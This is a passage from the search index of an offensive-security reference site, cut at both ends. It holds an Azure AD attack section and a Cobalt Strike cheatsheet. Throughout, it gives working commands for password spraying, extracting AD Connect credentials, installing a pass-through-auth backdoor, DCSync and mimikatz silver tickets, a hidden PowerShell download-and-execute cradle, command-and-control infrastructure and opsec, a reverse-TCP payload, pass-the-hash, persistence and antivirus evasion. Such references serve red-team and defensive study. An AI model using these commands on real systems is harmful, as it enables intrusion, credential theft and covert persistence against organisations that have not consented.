.\\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName \"SixByFour\"","title":"Conditional Access"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad","text":"With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD. Authenticate to your webmail portal (i.e. https://webmail.domain.com/) Change your browser URL to: https://azure.microsoft.com/ Pick the account from the active sessions Select Azure Active Directory and enjoy!","title":"Azure AD"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad-vs-active-directory","text":"Active Directory Azure AD LDAP REST API'S NTLM/Kerberos OAuth/SAML/OpenID Structured directory (OU tree) Flat structure GPO No GPO's Super fine-tuned access controls Predefined roles Domain/forest Tenant Trusts Guests Password Hash Syncronization (PHS) Passwords from on-premise AD are sent to the cloud Use replication via a service account created by AD Connect Pass Through Authentication (PTA) Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text Connect Windows Server AD to Azure AD using Federation Server (ADFS) Dir-Sync : Handled by on-premise Windows Server AD, sync username/password Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large","title":"Azure AD vs Active Directory"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#password-spray","text":"Default lockout policy of 10 failed attempts, locking out an account for 60 seconds git clone https://github.com/dafthack/MSOLSpray Import-Module .\\MSOLSpray.ps1 Invoke-MSOLSpray -UserList .\\userlist.txt -Password Winter2020 Invoke-MSOLSpray -UserList .\\users.txt -Password d0ntSprayme! # UserList - UserList file filled with usernames one-per-line in the format \"user@domain.com\" # Password - A single password that will be used to perform the password spray. # OutFile - A file to output valid results to. # Force - Forces the spray to continue and not stop when multiple account lockouts are detected. # URL - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.","title":"Password Spray"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#convert-guid-to-sid","text":"The user's AAD id is translated to SID by concatenating \"S-1\u201312\u20131-\" to the decimal representation of each section of the AAD Id. GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)] SID: S-1\u201312\u20131-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)] For example, the representation of 6aa89ecb-1f8f-4d92\u2013810d-b0dce30b6c82 is S-1\u201312\u20131\u20131789435595\u20131301421967\u20133702525313\u20132188119011","title":"Convert GUID to SID"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad-connect","text":"Check if Azure AD Connect is installed : Get-ADSyncConnector For PHS , we can extract the credentials For PTA , we can install the agent For Federation , we can extract the certificate from ADFS server using DA PS > Set-MpPreference -DisableRealtimeMonitoring $true PS > Copy-Item -ToSession $adcnct -Path C:\\Tools\\AADInternals.0.4.5.zip -Destination C:\\Users\\Administrator\\Documents PS > Expand-Archive C:\\Users\\Administrator\\Documents\\AADInternals.0.4.5.zip -DestinationPath C:\\Users\\Administrator\\Documents\\AADInternals PS > Import-Module C:\\Users\\Administrator\\Documents\\AADInternals\\AADInternals.psd1 PS > Get-AADIntSyncCredentials # Get Token for SYNC account and reset on-prem admin password PS > $passwd = ConvertToSecureString 'password' -AsPlainText -Force PS > $creds = New-Object System.Management.Automation.PSCredential (\"<Username>@<TenantName>.onmicrosoft.com\", $passwd) PS > GetAADIntAccessTokenForAADGraph -Credentials $creds \u2013SaveToCache PS > Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId PS > Set-AADIntUserPassword -SourceAnchor \"<IMMUTABLE-ID>\" -Password \"Password\" -Verbose Check if PTA is installed : Get-Command -Module PassthroughAuthPSModule Install a PTA Backdoor powershell PS AADInternals> Install-AADIntPTASpy PS AADInternals> Get-AADIntPTASpyLog -DecodePasswords","title":"Azure AD Connect"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad-connect-password-extraction","text":"Credentials in AD Sync : C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf Tool Requires code execution on target DLL dependencies Requires MSSQL locally Requires python locally ADSyncDecrypt Yes Yes No No ADSyncGather Yes No No Yes ADSyncQuery No (network RPC calls only) No Yes Yes git clone https://github.com/fox-it/adconnectdump # DCSync with AD Sync account","title":"Azure AD Connect - Password extraction"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad-connect-msol-accounts-password-and-dcsync","text":"You can perform DCSync attack using the MSOL account. Requirements: * Compromise a server with Azure AD Connect service * Access to ADSyncAdmins or local Administrators groups Use the script azuread_decrypt_msol.ps1 from @xpn to recover the decrypted password for the MSOL account: * azuread_decrypt_msol.ps1 : AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545 * azuread_decrypt_msol_v2.ps1 : Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.","title":"Azure AD Connect - MSOL Account's password and DCSync"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#azure-ad-connect-seamless-single-sign-on-silver-ticket","text":"Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA) Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account AZUREADSSOC is created in the on-prem AD. :warning: The password of the AZUREADSSOACC account never changes. Using https://autologon.microsoftazuread-sso.com/ to convert Kerberos tickets to SAML and JWT for Office 365 & Azure NTLM password hash of the AZUREADSSOACC account, e.g. f9969e088b2c13d93833d0ce436c76dd . powershell mimikatz.exe \"lsadump::dcsync /user:AZUREADSSOACC$\" exit AAD logon name of the user we want to impersonate, e.g. elrond@contoso.com . This is typically either his userPrincipalName or mail attribute from the on-prem AD. SID of the user we want to impersonate, e.g. S-1-5-21-2121516926-2695913149-3163778339-1234 . Create the Silver Ticket and inject it into Kerberos cache: powershell mimikatz.exe \"kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt\" exit Launch Mozilla Firefox Go to about:config and set the network.negotiate-auth.trusted-uris preference to value https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.","title":"Azure AD Connect - Seamless Single Sign On Silver Ticket"},{"location":"Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/#references","text":"Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !! Pass-the-PRT attack and detection by Microsoft Defender for \u2026 - Derk van der Woude - Jun 9 Azure AD Pass The Certificate - Mor - Aug 19, 2020 Get Access Tokens for Managed Service Identity on Azure App Service Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen An introduction to penetration testing Azure - Graceful Security Running Powershell scripts on Azure VM - Netspi Attacking Azure Cloud shell - Netspi Maintaining Azure Persistence via automation accounts - Netspi Detecting an attacks on active directory with Azure - Smartspate Azure AD Overview Windows Azure Active Directory in plain English Building Free Active Directory Lab in Azure - @kamran.bilgrami Attacking Azure/Azure AD and introducing Powerzure - SpecterOps Azure AD connect for RedTeam - @xpnsec Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020 Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020 Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020 AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhi\u00e8re (bak) - 2020-04-20 Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter The Art of the Device Code Phish - Bobby Cooke AZURE AD cheatsheet - BlackWasp","title":"References"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/","text":"Cobalt Strike Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity. $ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64 $ sudo ./teamserver 10.10.10.10 \"password\" [malleable C2 profile] $ ./cobaltstrike $ powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))\" Summary Infrastructure Redirectors Domain fronting OpSec Customer ID Payloads DNS Beacon SMB Beacon Metasploit compatibility Custom Payloads Malleable C2 Files Powershell and .NET Powershell commabds .NET remote execution Lateral Movement VPN & Pivots Kits Elevate Kit Persistence Kit Resource Kit Artifact Kit Mimikatz Kit Sleep Mask Kit Thread Stack Spoofer Beacon Object Files NTLM Relaying via Cobalt Strike References Infrastructure Redirectors sudo apt install socat socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80 Domain Fronting New Listener > HTTP Host Header Choose a domain in \"Finance & Healthcare\" sector OpSec Don't * Use default self-signed HTTPS certificate * Use default port (50050) * Use 0.0.0.0 DNS response * Metasploit compatibility, ask for a payload : wget -U \"Internet Explorer\" http://127.0.0.1/vl6D Do * Use a redirector (Apache, CDN, ...) * Firewall to only accept HTTP/S from the redirectors * Firewall 50050 and access via SSH tunnel * Edit default HTTP 404 page and Content type: text/plain * No staging set hosts_stage to false in Malleable C2 * Use Malleable Profile to taylor your attack to specific actors Customer ID The Customer ID is a 4-byte number associated with a Cobalt Strike license key. Cobalt Strike 3.9 and later embed this information into the payload stagers and stages generated by Cobalt Strike. The Customer ID value is the last 4-bytes of a Cobalt Strike payload stager in Cobalt Strike 3.9 and later. The trial has a Customer ID value of 0. Cobalt Strike does not use the Customer ID value in its network traffic or other parts of the tool Payloads DNS Beacon Edit the Zone File for the domain Create an A record for Cobalt Strike system Create an NS record that points to FQDN of your Cobalt Strike system Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server's A record. nslookup jibberish.beacon polling.campaigns.domain.com nslookup jibberish.beacon campaigns.domain.com Example of DNS on Digital Ocean: NS example.com directs to 10.10.10.10. 86400 NS polling.campaigns.example.com directs to campaigns.example.com. 3600 A campaigns.example.com directs to 10.10.10.10 3600 systemctl disable systemd-resolved systemctl stop systemd-resolved rm /etc/resolv.conf echo \"nameserver 8.8.8.8\" > /etc/resolv.conf echo \"nameserver 8.8.4.4\" >> /etc/resolv.conf Configuration: 1. host : campaigns.domain.com 2. beacon : polling.campaigns.domain.com 3. Interact with a beacon, and sleep 0 SMB Beacon link [host] [pipename] connect [host] [port] unlink [host] [PID] jump [exec] [host] [pipe] SMB Beacon uses Named Pipes. You might encounter these error code while running it. Error Code Meaning Description 2 File Not Found There is no beacon for you to link to 5 Access is denied Invalid credentials or you don't have permission 53 Bad Netpath You have no trust relationship with the target system. It may or may not be a beacon there. SSH Beacon # deploy a beacon beacon> help ssh Use: ssh [target:port] [user] [pass] Spawn an SSH client and attempt to login to the specified target beacon> help ssh-key Use: ssh [target:port] [user] [/path/to/key.pem] Spawn an SSH client and attempt to login to the specified target # beacon's commands upload Upload a file download Download a file socks Start SOCKS4a server to relay traffic sudo Run a command via sudo rportfwd Setup a reverse port forward shell Execute a command via the shell Metasploit compatibility Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https Set LHOST and LPORT to the beacon Set DisablePayloadHandler to True Set PrependMigrate to True exploit -j Custom Payloads https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c * Attacks > Packages > Payload Generator * Attacks > Packages > Scripted Web Delivery (S) $ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor $ C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\Temp\\dns_raw_stageless_x64.xml $ %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \\\\10.10.10.10\\Shared\\dns_raw_stageless_x86.xml Malleable C2 List of Malleable Profiles hosted on Github * Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles * Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2 * Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles * SourcePoint is a C2 profile generator https://github.com/Tylous/SourcePoint Example of syntax set useragent \"SOME AGENT\"; # GOOD set useragent 'SOME AGENT'; # BAD prepend \"This is an example;\"; # Escape Double quotes append \"here is \\\"some\\\" stuff\"; # Escape Backslashes append \"more \\\\ stuff\"; # Some special characters do not need escaping prepend \"!@#$%^&*()\"; Check a profile with ./c2lint . * A result of 0 is returned if c2lint completes with no errors * A result of 1 is returned if c2lint completes with only warnings * A result of 2 is returned if c2lint completes with only errors * A result of 3 is returned if c2lint completes with both errors and warning Files # List the file on the specified directory beacon > ls <C:\\Path> # Change into the specified working directory beacon > cd [directory] # Delete a file\\folder beacon > rm [file\\folder] # File copy beacon > cp [src] [dest] # Download a file from the path on the Beacon host beacon > download [C:\\filePath] # Lists downloads in progress beacon > downloads # Cancel a download currently in progress beacon > cancel [*file*] # Upload a file from the attacker to the current Beacon host beacon > upload [/path/to/file] Powershell and .NET Powershell commands # Import a Powershell .ps1 script from the control server and save it in memory in Beacon beacon > powershell-import [/path/to/script.ps1] # Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned. beacon > powershell [commandlet][arguments] # Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto beacon > powerpick [commandlet] [argument] # Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs beacon > psinject [pid][arch] [commandlet] [arguments] .NET remote execution Run a local .NET executable as a Beacon post-exploitation job. Require: * Binaries compiled with the \"Any CPU\" configuration. beacon > execute-assembly [/path/to/script.exe] [arguments] beacon > execute-assembly /home/audit/Rubeus.exe [*] Tasked beacon to run .NET program: Rubeus.exe [+] host called home, sent: 318507 bytes [+] received output: ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.4.2 Lateral Movement :warning: OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe portscan: Performs a portscan on a specific target. runas: A wrapper of runas.exe, using credentials you can run a command as another user. pth: By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \\ :exclamation: This module needs Administrator privileges. steal_token: Steal a token from a specified process. make_token: By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user. jump: Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \\ :exclamation: The jump module will use the current delegation/impersonation token to authenticate on the remote target. \\ :muscle: We can combine the jump module with the make_token or pth module for a quick \"jump\" to another target on the network. remote-exec: Execute a command on a remote target using psexec, winrm or wmi. \\ :exclamation: The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target. ssh/ssh-key: Authenticate using ssh with password or private key. Works for both linux and windows hosts. :warning: All the commands launch powershell.exe Beacon Remote Exploits ====================== jump [module] [target] [listener] psexec x86 Use a service to run a Service EXE artifact psexec64 x64 Use a service to run a Service EXE artifact psexec_psh x86 Use a service to run a PowerShell one-liner winrm x86 Run a PowerShell script via WinRM winrm64 x64 Run a PowerShell script via WinRM Beacon Remote Execute Methods ============================= remote-exec [module] [target] [command] Methods Description ------- ----------- psexec Remote execute via Service Control Manager winrm Remote execute via WinRM (PowerShell) wmi Remote execute via WMI (PowerShell) Opsec safe Pass-the-Hash: 1. mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:\"powershell -w hidden\" 2. steal_token PID Assume Control of Artifact Use link to connect to SMB Beacon Use connect to connect to TCP Beacon VPN & Pivots :warning: Covert VPN doesn't work with W10, and requires Administrator access to deploy. Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon's sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second. # Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage. beacon > socks [PORT] beacon > socks [port] beacon > socks [port] [socks4] beacon > socks [port] [socks5] beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging] # Proxy browser traffic through a specified Internet Explorer process. beacon > browserpivot [pid] [x86|x64] # Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port. beacon > rportfwd [bind port] [forward host] [forward port] # spunnel : Spawn an agent and create a reverse port forward tunnel to its controller. ~= rportfwd + shspawn. msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin beacon> spunnel x64 184.105.181.155 4444 C:\\Payloads\\msf.bin # spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller # then you can handle the connect back on your MSF multi handler beacon> spunnel_local x64 127.0.0.1 4444 C:\\Payloads\\msf.bin Kits Cobalt Strike Community Kit - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike Elevate Kit UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018) beacon> runasadmin Beacon Command Elevators ======================== Exploit Description ------- ----------- ms14-058 TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113) ms15-051 Windows ClientCopyImage Win32k Exploit (CVE 2015-1701) ms16-016 mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051) svc-exe Get SYSTEM via an executable run as a service uac-schtasks Bypass UAC with schtasks.exe (via SilentCleanup) uac-token-duplication Bypass UAC with Token Duplication Persistence Kit https://github.com/0xthirteen/MoveKit https://github.com/fireeye/SharPersist ```powershell # List persistences SharPersist -t schtaskbackdoor -m list SharPersist -t startupfolder -m list SharPersist -t schtask -m list Add a persistence SharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m add SharPersist -t schtaskbackdoor -n \"Something Cool\" -m remove SharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add SharPersist -t service -n \"Some Service\" -m remove SharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add SharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add -o hourly SharPersist -t schtask -n \"Some Task\" -m remove ``` Resource Kit The Resource Kit is Cobalt Strike's means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows Artifact Kit Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -> Script Manager, and load the artifact.cna script from that technique's folder. Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 : Download the artifact kit : Go to Help -> Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike) Install the dependencies : sudo apt-get install mingw-w64 Edit the Artifact code Change pipename strings Change VirtualAlloc in patch.c / patch.exe , e.g: HeapAlloc Change Import Build the Artifact Cobalt Strike -> Script Manager > Load .cna Mimikatz Kit Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724) Load the mimikatz.cna aggressor script Use mimikatz functions as normal Sleep Mask Kit The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping. Use the included build.sh or build.bat script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons. Thread Stack Spoofer An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory. Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option artifactkit_stack_spoof in the config file arsenal_kit.config . Beacon Object Files A BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs Example: https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h Compile ```ps1 # To compile this with Visual Studio: cl.exe /c /GS- hello.c /Fohello.o To compile this with x86 MinGW: i686-w64-mingw32-gcc -c hello.c -o hello.o To compile this with x64 MinGW: x86_64-w64-mingw32-gcc -c hello.c -o hello.o `` * Execute: inline-execute /path/to/hello.o` NTLM Relaying via Cobalt Strike beacon> socks 1080 kali> proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET> beacon> rportfwd_local 8445 <IP_KALI> 445 beacon> upload C:\\Tools\\PortBender\\WinDivert64.sys beacon> PortBender redirect 445 8445 References Red Team Ops with Cobalt Strike (1 of 9): Operations Red Team Ops with Cobalt Strike (2 of 9): Infrastructure Red Team Ops with Cobalt Strike (3 of 9): C2 Red Team Ops with Cobalt Strike (4 of 9): Weaponization Red Team Ops with Cobalt Strike (5 of 9): Initial Access Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement Red Team Ops with Cobalt Strike (9 of 9): Pivoting A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019 TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE \u2013 UB 2018 - NOV 25 2018 Cobalt Strike - DNS Beacon How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017 NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse Cobalt Strike - User Guide Cobalt Strike 4.6 - User Guide PDF","title":"Cobalt Strike"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#cobalt-strike","text":"Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity. $ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64 $ sudo ./teamserver 10.10.10.10 \"password\" [malleable C2 profile] $ ./cobaltstrike $ powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))\"","title":"Cobalt Strike"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#summary","text":"Infrastructure Redirectors Domain fronting OpSec Customer ID Payloads DNS Beacon SMB Beacon Metasploit compatibility Custom Payloads Malleable C2 Files Powershell and .NET Powershell commabds .NET remote execution Lateral Movement VPN & Pivots Kits Elevate Kit Persistence Kit Resource Kit Artifact Kit Mimikatz Kit Sleep Mask Kit Thread Stack Spoofer Beacon Object Files NTLM Relaying via Cobalt Strike References","title":"Summary"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#infrastructure","text":"","title":"Infrastructure"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#redirectors","text":"sudo apt install socat socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80","title":"Redirectors"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#domain-fronting","text":"New Listener > HTTP Host Header Choose a domain in \"Finance & Healthcare\" sector","title":"Domain Fronting"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#opsec","text":"Don't * Use default self-signed HTTPS certificate * Use default port (50050) * Use 0.0.0.0 DNS response * Metasploit compatibility, ask for a payload : wget -U \"Internet Explorer\" http://127.0.0.1/vl6D Do * Use a redirector (Apache, CDN, ...) * Firewall to only accept HTTP/S from the redirectors * Firewall 50050 and access via SSH tunnel * Edit default HTTP 404 page and Content type: text/plain * No staging set hosts_stage to false in Malleable C2 * Use Malleable Profile to taylor your attack to specific actors","title":"OpSec"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#customer-id","text":"The Customer ID is a 4-byte number associated with a Cobalt Strike license key. Cobalt Strike 3.9 and later embed this information into the payload stagers and stages generated by Cobalt Strike. The Customer ID value is the last 4-bytes of a Cobalt Strike payload stager in Cobalt Strike 3.9 and later. The trial has a Customer ID value of 0. Cobalt Strike does not use the Customer ID value in its network traffic or other parts of the tool","title":"Customer ID"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#payloads","text":"","title":"Payloads"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#dns-beacon","text":"Edit the Zone File for the domain Create an A record for Cobalt Strike system Create an NS record that points to FQDN of your Cobalt Strike system Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server's A record. nslookup jibberish.beacon polling.campaigns.domain.com nslookup jibberish.beacon campaigns.domain.com Example of DNS on Digital Ocean: NS example.com directs to 10.10.10.10. 86400 NS polling.campaigns.example.com directs to campaigns.example.com. 3600 A campaigns.example.com directs to 10.10.10.10 3600 systemctl disable systemd-resolved systemctl stop systemd-resolved rm /etc/resolv.conf echo \"nameserver 8.8.8.8\" > /etc/resolv.conf echo \"nameserver 8.8.4.4\" >> /etc/resolv.conf Configuration: 1. host : campaigns.domain.com 2. beacon : polling.campaigns.domain.com 3. Interact with a beacon, and sleep 0","title":"DNS Beacon"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#smb-beacon","text":"link [host] [pipename] connect [host] [port] unlink [host] [PID] jump [exec] [host] [pipe] SMB Beacon uses Named Pipes. You might encounter these error code while running it. Error Code Meaning Description 2 File Not Found There is no beacon for you to link to 5 Access is denied Invalid credentials or you don't have permission 53 Bad Netpath You have no trust relationship with the target system. It may or may not be a beacon there.","title":"SMB Beacon"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#ssh-beacon","text":"# deploy a beacon beacon> help ssh Use: ssh [target:port] [user] [pass] Spawn an SSH client and attempt to login to the specified target beacon> help ssh-key Use: ssh [target:port] [user] [/path/to/key.pem] Spawn an SSH client and attempt to login to the specified target # beacon's commands upload Upload a file download Download a file socks Start SOCKS4a server to relay traffic sudo Run a command via sudo rportfwd Setup a reverse port forward shell Execute a command via the shell","title":"SSH Beacon"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#metasploit-compatibility","text":"Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https Set LHOST and LPORT to the beacon Set DisablePayloadHandler to True Set PrependMigrate to True exploit -j","title":"Metasploit compatibility"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#custom-payloads","text":"https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c * Attacks > Packages > Payload Generator * Attacks > Packages > Scripted Web Delivery (S) $ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor $ C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\Temp\\dns_raw_stageless_x64.xml $ %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \\\\10.10.10.10\\Shared\\dns_raw_stageless_x86.xml","title":"Custom Payloads"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#malleable-c2","text":"List of Malleable Profiles hosted on Github * Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles * Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2 * Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles * SourcePoint is a C2 profile generator https://github.com/Tylous/SourcePoint Example of syntax set useragent \"SOME AGENT\"; # GOOD set useragent 'SOME AGENT'; # BAD prepend \"This is an example;\"; # Escape Double quotes append \"here is \\\"some\\\" stuff\"; # Escape Backslashes append \"more \\\\ stuff\"; # Some special characters do not need escaping prepend \"!@#$%^&*()\"; Check a 